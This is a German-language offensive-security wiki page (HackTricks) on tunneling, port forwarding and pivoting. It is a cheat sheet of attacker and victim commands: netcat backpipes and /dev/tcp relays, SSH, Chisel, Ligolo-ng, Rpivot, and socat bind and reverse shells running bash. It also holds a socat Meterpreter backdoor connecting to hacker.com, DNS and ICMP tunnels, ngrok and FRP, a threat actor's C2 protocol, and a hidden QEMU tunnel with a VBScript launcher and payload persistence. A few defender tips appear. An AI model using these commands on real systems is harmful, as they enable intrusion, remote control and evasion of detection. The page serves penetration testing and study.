# Tunneling und Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap-Tipp

> [!WARNING]
> **ICMP**- und **SYN**-Scans können nicht durch SOCKS-Proxies getunnelt werden. Daher müssen wir die **Ping-Erkennung** deaktivieren (`-Pn`) und **TCP-Scans** (`-sT`) angeben, damit dies funktioniert.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Grafische SSH-Verbindung (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Lokales Port2Port

Neuen Port im SSH-Server öffnen --> Anderer Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokaler Port --> Kompromittierter Host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokaler Port --> Kompromittierter Host (SSH) --> Beliebiges Ziel
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Dies ist nützlich, um über eine DMZ hinweg Reverse Shells von internen Hosts zu Ihrem Host zu erhalten:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Du benötigst **root auf beiden Geräten** (da du neue Interfaces erstellen wirst), und die sshd-Konfiguration muss Root-Login erlauben:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Weiterleitung auf der Serverseite aktivieren
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Eine neue Route auf der Client-Seite einrichten
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Sicherheit – Terrapin Attack (CVE-2023-48795)**
> Der Terrapin-Downgrade-Angriff von 2023 kann es einem man-in-the-middle ermöglichen, den frühen SSH-Handshake zu manipulieren und Daten in **jeden weitergeleiteten Kanal** ( `-L`, `-R`, `-D` ) einzuschleusen. Stellen Sie sicher, dass sowohl Client als auch Server aktualisiert sind (**OpenSSH ≥ 9.6/LibreSSH 6.7**) oder deaktivieren Sie die anfälligen `chacha20-poly1305@openssh.com`- und `*-etm@openssh.com`-Algorithmen in `sshd_config`/`ssh_config` ausdrücklich, bevor Sie sich auf SSH-Tunnel verlassen.

## SSHUTTLE

Sie können den gesamten **Datenverkehr** zu einem **Teilnetz** über einen Host via **ssh** **tunneln**.\
Zum Beispiel die gesamte Datenübertragung zu 10.10.10.0/24 weiterleiten
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Mit einem privaten Schlüssel verbinden
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokaler Port --> Kompromittierter Host (aktive Sitzung) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Eine weitere Möglichkeit:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Öffne einen Port auf dem teamserver, der auf allen Interfaces lauscht und dazu verwendet werden kann, den **Traffic durch den beacon zu routen**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In diesem Fall wird der **port auf dem beacon host geöffnet**, nicht auf dem Team Server, und der Traffic wird an den Team Server gesendet und von dort an den angegebenen host:port.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Zu beachten:

- Beacons reverse port forward ist dafür ausgelegt, **Traffic zum Team Server zu tunneln, nicht für das Relaying zwischen einzelnen Maschinen**.
- Der Traffic wird **innerhalb von Beacons C2-Traffic getunnelt**, einschließlich P2P-Links.
- **Admin-Rechte sind nicht erforderlich**, um reverse port forwards auf hohen Ports zu erstellen.

### rPort2Port local

> [!WARNING]
> In diesem Fall wird der **Port auf dem Beacon-Host geöffnet**, nicht auf dem Team Server, und der **Traffic wird an den Cobalt Strike Client gesendet** (nicht an den Team Server) und von dort an den angegebenen Host:Port.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Du musst einen Web-Datei-Tunnel hochladen: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Du kannst es von der Release-Seite von [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen\
Du musst **dieselbe Version für Client und Server** verwenden

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Verwende dieselbe Version für Agent und Proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent-Bindung und Listening
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Auf lokale Ports des Agents zugreifen
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse-Tunnel. Der Tunnel wird vom Opfer gestartet.\
Ein socks4-Proxy wird auf 127.0.0.1:1080 erstellt
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivoting über **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port über socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter über SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Du kannst einen **nicht authentifizierten Proxy** umgehen, indem du diese Zeile anstelle der letzten in der Konsole des Opfers ausführst:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL-Socat-Tunnel

**/bin/sh console**

Zertifikate auf beiden Seiten erstellen: Client und Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Verbinden Sie den lokalen SSH-Port (22) mit Port 443 des Angreifer-Hosts
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Es ist wie eine Konsolenversion von PuTTY (die Optionen sind einem ssh-Client sehr ähnlich).

Da diese Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Service und den Port öffnen, damit wir eine Reverse Connection herstellen können. Um anschließend nur einen lokal erreichbaren Port an einen Port auf unserer Maschine weiterzuleiten:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Du musst lokaler Administrator sein (für jeden Port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Du benötigst **RDP-Zugriff auf das System**.\
Download:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) aus der Remote Desktop Service-Funktion von Windows. DVC ist für das **Tunneln von Paketen über die RDP-Verbindung** verantwortlich.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Lade auf deinem Client-Computer **`SocksOverRDP-Plugin.dll`** wie folgt:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Jetzt können wir uns über **RDP** mit dem **victim** verbinden, indem wir **`mstsc.exe`** verwenden. Daraufhin sollte ein **prompt** erscheinen, dass das **SocksOverRDP plugin** aktiviert ist und auf **127.0.0.1:1080** **listen** wird.

Über **RDP** **connecten** und die Binärdatei `SocksOverRDP-Server.exe` auf den Rechner des **victim** hochladen und ausführen:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Bestätige nun auf deiner Maschine (Angreifer), dass Port 1080 auf Verbindungen wartet:
```
netstat -antb | findstr 1080
```
Jetzt können Sie [**Proxifier**](https://www.proxifier.com/) **verwenden, um den Traffic über diesen Port zu leiten.**

## Windows-GUI-Apps mit einem Proxy versehen

Mit [**Proxifier**](https://www.proxifier.com/) können Sie Windows-GUI-Apps über einen Proxy verbinden.\
Fügen Sie unter **Profile -> Proxy Servers** die IP-Adresse und den Port des SOCKS-Servers hinzu.\
Fügen Sie unter **Profile -> Proxification Rules** den Namen des Programms, dessen Traffic Sie proxifizieren möchten, sowie die Verbindungen zu den IPs hinzu, über die der Traffic geleitet werden soll.

## NTLM proxy bypass

Das zuvor erwähnte Tool: **Rpivot**\
**OpenVPN** kann dies ebenfalls umgehen, wenn Sie diese Optionen in der Konfigurationsdatei festlegen:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Es authentifiziert sich gegenüber einem Proxy und bindet lokal einen Port, der an den von dir angegebenen externen Dienst weitergeleitet wird. Anschließend kannst du das Tool deiner Wahl über diesen Port verwenden.\
Zum Beispiel, um Port 443 weiterzuleiten
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Wenn du beispielsweise auf dem **Opfer** den **SSH**-Dienst so einstellst, dass er auf Port 443 lauscht, kannst du dich über den Port 2222 des **Angreifers** damit verbinden.\
Du könntest auch einen **meterpreter** verwenden, der sich mit localhost:443 verbindet, während der **Angreifer** auf Port 2222 lauscht.

## YARP

Ein von Microsoft erstellter Reverse Proxy. Du findest ihn hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Auf beiden Systemen wird Root benötigt, um tun-Adapter zu erstellen und Daten mithilfe von DNS-Abfragen zwischen ihnen zu tunneln.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Der Tunnel wird sehr langsam sein. Du kannst über diesen Tunnel eine komprimierte SSH-Verbindung herstellen, indem du Folgendes verwendest:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Hier herunterladen**](https://github.com/iagox86/dnscat2)**.**

Stellt einen C\&C-Kanal über DNS her. Es benötigt keine Root-Rechte.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Du kannst [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) verwenden, um einen dnscat2-Client in PowerShell auszuführen:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Portweiterleitung mit dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains-DNS ändern

Proxychains fängt den `gethostbyname`-libc-Aufruf ab und tunnelt DNS-Anfragen über TCP durch den socks-Proxy. **Standardmäßig** ist der von proxychains verwendete **DNS**-Server **4.2.2.2** (hartcodiert). Um ihn zu ändern, bearbeite die Datei: _/usr/lib/proxychains3/proxyresolv_ und ändere die IP. Wenn du dich in einer **Windows-Umgebung** befindest, kannst du die IP des **Domain Controllers** festlegen.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Der Storm-2603-Akteur erstellte einen **Dual-Channel-C2 ("AK47C2")**, der **ausschließlich** ausgehenden **DNS**- und **plain HTTP POST**-Traffic missbraucht – zwei Protokolle, die in Unternehmensnetzwerken nur selten blockiert werden.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Generiert eine zufällige 5-stellige SessionID (z. B. `H4T14`).
• Stellt `1` für *task requests* oder `2` für *results* voran und verkettet verschiedene Felder (Flags, SessionID, Computername).
• Jedes Feld wird mit dem ASCII-Schlüssel `VHBD@H` **XOR-verschlüsselt**, hexadezimal kodiert und mit Punkten verbunden – abschließend folgt die vom Angreifer kontrollierte Domain:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Für **TXT**- (und als Fallback **MG**-)Records werden `DnsQuery()`-Anfragen verwendet.
• Wenn die Antwort 0xFF Bytes überschreitet, **fragmentiert** die Backdoor die Daten in 63-Byte-Stücke und fügt die Marker
`s<SessionID>t<TOTAL>p<POS>` ein, damit der C2-Server sie wieder sortieren kann.

2. **HTTP mode (AK47HTTP)**
• Erstellt einen JSON-Envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Der gesamte Blob wird mit `VHBD@H` XOR-verschlüsselt, hexadezimal kodiert und als Body eines **`POST /`** mit dem Header `Content-Type: text/plain` gesendet.
• Die Antwort verwendet dieselbe Kodierung und das Feld `cmd` wird mit `cmd.exe /c <command> 2>&1` ausgeführt.

Blue Team notes
• Achte auf ungewöhnliche **TXT queries**, deren erstes Label aus einer langen Hexadezimalzeichenfolge besteht und die immer mit einer seltenen Domain enden.
• Ein konstanter XOR-Schlüssel gefolgt von ASCII-Hex ist mit YARA leicht erkennbar: `6?56484244?484` (`VHBD@H` in Hex).
• Bei HTTP sollten `text/plain`-POST-Bodies markiert werden, die ausschließlich aus Hex bestehen und eine gerade Anzahl von Bytes aufweisen.

{{#note}}
Der gesamte Channel passt in **standardkonforme RFC queries** und hält jedes Subdomain-Label unter 63 Bytes, wodurch er in den meisten DNS-Logs unauffällig bleibt.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Auf beiden Systemen wird Root benötigt, um tun-Adapter zu erstellen und Daten mithilfe von ICMP echo requests zwischen ihnen zu tunneln.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Hier herunterladen**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **ist ein Tool, um Lösungen mit einer einzigen Befehlszeile im Internet bereitzustellen.**\
_Expositions-URIs sehen folgendermaßen aus:_ **UID.ngrok.io**

### Installation

- Konto erstellen: https://ngrok.com/signup
- Client herunterladen:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Grundlegende Verwendung

**Dokumentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Bei Bedarf können auch Authentifizierung und TLS hinzugefügt werden._

#### TCP-Tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Dateien über HTTP verfügbar machen
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP-Aufrufe sniffen

_Nützlich für XSS,SSRF,SSTI ..._\
Direkt über stdout oder in der HTTP-Schnittstelle [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Internen HTTP-Service tunneln
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Einfaches Konfigurationsbeispiel für ngrok.yaml

Es öffnet 3 Tunnel:

- 2 TCP
- 1 HTTP zur Bereitstellung statischer Dateien aus /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflares `cloudflared`-Daemon kann ausgehende Tunnel erstellen, die **lokale TCP/UDP-Dienste** verfügbar machen, ohne eingehende Firewall-Regeln zu benötigen, wobei die Edge-Infrastruktur von Cloudflare als Treffpunkt verwendet wird. Das ist besonders praktisch, wenn die Egress-Firewall nur HTTPS-Datenverkehr zulässt, eingehende Verbindungen jedoch blockiert werden.

### Schneller Tunnel-One-Liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5-Pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Persistente Tunnel mit DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Connector starten:
```bash
cloudflared tunnel run mytunnel
```
Da der gesamte Traffic den Host **outbound über 443** verlässt, sind Cloudflared-Tunnel eine einfache Möglichkeit, ingress ACLs oder NAT-Grenzen zu umgehen. Beachte, dass die Binary normalerweise mit erhöhten Berechtigungen ausgeführt wird – verwende nach Möglichkeit Container oder das Flag `--user`.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ist ein aktiv gepflegter Go-Reverse-Proxy, der **TCP, UDP, HTTP/S, SOCKS und P2P-NAT-hole-punching** unterstützt. Seit **v0.53.0 (Mai 2024)** kann er als **SSH Tunnel Gateway** agieren, sodass ein Zielhost mit ausschließlich dem standardmäßigen OpenSSH-Client einen Reverse-Tunnel aufbauen kann – ohne zusätzliche Binary.

### Klassischer Reverse-TCP-Tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Verwendung des neuen SSH-Gateways (keine frpc-Binärdatei)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Der obige Befehl veröffentlicht den Port **8080** des Opfers als **attacker_ip:9000**, ohne zusätzliche Tools einzusetzen – ideal für Pivoting nach dem Living-off-the-Land-Prinzip.

## Verdeckte VM-basierte Tunnels mit QEMU

QEMUs User-Mode-Networking (`-netdev user`) unterstützt eine Option namens `hostfwd`, die einen TCP/UDP-Port auf dem *Host* **bindet und in den *Gast* weiterleitet**. Wenn im Gast ein vollständiger SSH-Daemon läuft, stellt die hostfwd-Regel eine kurzlebige SSH-Sprungbox bereit, die vollständig innerhalb einer temporären VM existiert – perfekt, um C2-Datenverkehr vor EDR zu verbergen, da sämtliche schädlichen Aktivitäten und Dateien auf der virtuellen Festplatte verbleiben.<sup>[[1]](#references)</sup>

### Kurzer Einzeiler
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Der obige Befehl startet ein **Tiny Core Linux**-Image (`tc.qcow2`) im RAM.
• Port **2222/tcp** auf dem Windows-Host wird transparent an **22/tcp** innerhalb des Gasts weitergeleitet.
• Aus Sicht des Angreifers stellt das Ziel lediglich Port 2222 bereit; alle dort eintreffenden Pakete werden vom in der VM laufenden SSH-Server verarbeitet.

### Unauffälliger Start über VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Das Ausführen des Skripts mit `cscript.exe //B update.vbs` hält das Fenster verborgen.

### Persistenz im Gast

Da Tiny Core zustandslos ist, gehen Angreifer normalerweise folgendermaßen vor:

1. Payload nach `/opt/123.out` ablegen
2. An `/opt/bootlocal.sh` anhängen:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc` und `opt` zu `/opt/filetool.lst` hinzufügen, damit der Payload beim Herunterfahren in `mydata.tgz` gepackt wird.

### Warum dies der Erkennung entgeht

• Nur zwei nicht signierte Executables (`qemu-system-*.exe`) greifen auf die Festplatte zu; es werden keine Treiber oder Services installiert.  
• Sicherheitsprodukte auf dem Host sehen **harmlosen Loopback-Traffic** (der tatsächliche C2 endet innerhalb der VM).  
• Memory-Scanner analysieren den bösartigen Process-Space niemals, weil er in einem anderen OS lebt.

### Tipps für Defender

• Auf **unerwartete QEMU/VirtualBox/KVM-Binaries** in vom Benutzer beschreibbaren Pfaden alerten.  
• Ausgehende Verbindungen blockieren, die von `qemu-system*.exe` ausgehen.  
• Nach seltenen Listening-Ports (2222, 10022, …) suchen, die unmittelbar nach dem Start von QEMU gebunden werden.

## IIS/HTTP.sys-Relayknoten über `HttpAddUrl` (ShadowPad)

Das IIS-Modul von Ink Dragon’s ShadowPad verwandelt jeden kompromittierten Perimeter-Webserver in eine duale **Backdoor + Relay**, indem es verdeckte URL-Präfixe direkt auf der HTTP.sys-Schicht bindet:<sup>[[3]](#references)</sup>

* **Config-Defaults** – Wenn die JSON-Config des Moduls Werte auslässt, greift es auf glaubwürdige IIS-Defaults zurück (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Dadurch beantwortet IIS harmlosen Traffic mit dem korrekten Branding.
* **Wildcard-Interception** – Die Operatoren geben eine durch Semikolons getrennte Liste von URL-Präfixen an (Wildcards in Host und Pfad). Das Modul ruft für jeden Eintrag `HttpAddUrl` auf, sodass HTTP.sys passende Requests an den bösartigen Handler weiterleitet, *bevor* der Request IIS-Module erreicht.
